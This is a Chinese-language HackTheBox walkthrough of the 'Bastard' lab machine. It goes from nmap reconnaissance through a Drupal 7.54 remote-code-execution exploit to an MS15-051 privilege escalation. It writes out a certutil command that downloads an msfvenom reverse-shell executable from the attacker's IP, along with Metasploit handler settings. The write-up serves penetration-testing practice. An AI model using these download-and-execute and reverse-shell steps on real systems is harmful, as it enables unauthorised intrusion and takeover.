# HTB靶场记录之Bastard

HTB是一个靶机平台，里面包含多种系统类型的靶机，并且很多靶机非常贴近实战情景，是一个学习渗透测试不错的靶场。

  

![](../Images/ada7b61d9cbe52aec609f97ff05ca394.png)

  

**1、靶机介绍**

这次的靶机是Bastard。  

  

![](../Images/4407b3213562499eab6600a2d5ad619a.png)

  

**2、信息搜集**

由于autorecon的速度比较慢，这里直接nmap -sC(默认脚本) -sS(快速扫描)过一下，80端口有个Drupal 7的标题，Drupal是个CMS具体的版本信息，可以查看/CHANGELOG.txt。  

  

![](../Images/933e528102c2d85f98179c3d38327eeb.png)

  

首先确保这个80端口能正常访问

  

![](../Images/1a8d0dcc5ca5ee0bebaa3644d2a1e41e.png)

  

其次我们跟进一下可以看到版本为7.54

  

![](../Images/5951c2e2055a39eb8533f0842e3c38ee.png)

  

**3、搜索payload**

我们肯定是用searchsploit查看漏洞版本信息，而版本为7.54最好使用Drupal 7.x Module Services -RemoteCode Execution。

  

![](../Images/f406a1c6030a83108ac1cbb138a9d366.png)

  

在网上找了一个相关的Drupal的RCE漏洞的CVE编号，并且有很多不同的payload。

  

![](../Images/95066e2145b4f3acdb6e0a206826df94.png)

  

在GitHub上漏洞编号就可以，看了一下是python3的格式，并需要安装好以下的库才能顺利执行。

  

![](../Images/2db1bf85694f6b4137a2dc60fe4ab6c4.png)

  

**4、getshell进行中**

此时直接一个python文件名-cwhoami成功执行。  

  

![](../Images/992b79f20994018464560b443de92151.png)

  

或者是dir可列出当前目录下的文件名，并指导当前目录为C:\\inetpub\\drupal-7.54。  

  

![](../Images/e2c0658e3113b89bd52ec6cd5c8cd0a0.png)

  

目前的想法是创建一个新目录，然后我们生成恶意文件传上去一个运行接收shell回来(建议最好创建一个文件夹，用powershell的远程传文件python表示传输成功，但不知道把文件传到哪了)。

  

使用mkdir创建一个cunfang文件夹

  

![](../Images/6921fdf684b72de3eca2fc2c7503c35d.png)

  

关于传文件这里，在网上找了一一个CertUtil.exe的内置程序比较便捷。

  

格式为: 

certutil.exe -urlcache -split -f http://ip:端口/文件名

  

![](../Images/921e8db875400ea635f5c62d53ac026c.png)

  

此时用msfVENOM生成一个.exe

  

![](../Images/8be3a56845aadf59318f38c6bd50ffc2.png)

  

用刚才的payload通过

certutil.exe-urlcache -split -f http://10.10.14.5:8080/makabaka.exe

把文件传上去(这里的ip是开了python共享模式的kali IP)

  

![](../Images/99309919d2303f6bf285487e3f402b32.png)

  

此时打开我们的MSF使用exploit/multi/handler经典模块，设置好kali的IP和端口顺便把payload设置为windows/x64/shell/reverse\_tcp以后使用run开始监听。

  

![](../Images/e7feea2b664d8a64d65c2232737af365.png)

  

此时用回payload远程执行，如上图所示直接接收shell成功。

  

![](../Images/95f47b8264ca8f155096e1d55b388f4c.png)

  

这里拿到user的flag。

  

![](../Images/d76a795675821595afb98afd157e73bb.png)

  

**5、提权**

这里提权我打算用MSF的自带提权payload。  

  

![](../Images/808ffbaa943f316c27ff4dd52d403828.png)

  

用上面的方法添加多一个shell出来，出现meterpreter就是代表成功。

  

![](../Images/f0e8200362b4ea0b6cd9749b9f8ec582.png)

  

先使用background退出去，注意看session，然后使用

 post/multi/recon/local\_exploit\_suggester模块，设置好session以后run。

  

![](../Images/ce57f00df6e301727ce20305539303b1.png)

  

根据systeminfo可知这是windows 2008 R2，可以使用大杀器MS15-051可针对Windows Server 2008 R2。

  

可以理解为49298大杀器通杀之前的靶机。  

  

![](../Images/6865f1a154d26c3919424764fae21c11.png)

  

这里要到github上下载，然后用同样的方法certutil.exe传上去。

  

![](../Images/64da0e7b00935f0bf1fe217fde0002ff.png)

  

此时一波.exe whoami执行成功。

  

然而能变换最高权限只有在运行.exe +命令的情况下才行：

  

![](../Images/eef0e60f6919ad97e7e306c90ce90c98.png)

  

把shell.exe之前生成的恶意文件拿出来，再用MSF监听。

  

![](../Images/87a59df16e577efda63bbc323a554974.png)

  

此时真正变为管理员能拿到root的flag。

![](../Images/cf477fc9566304e7cc3ec7e4b1523f72.png)
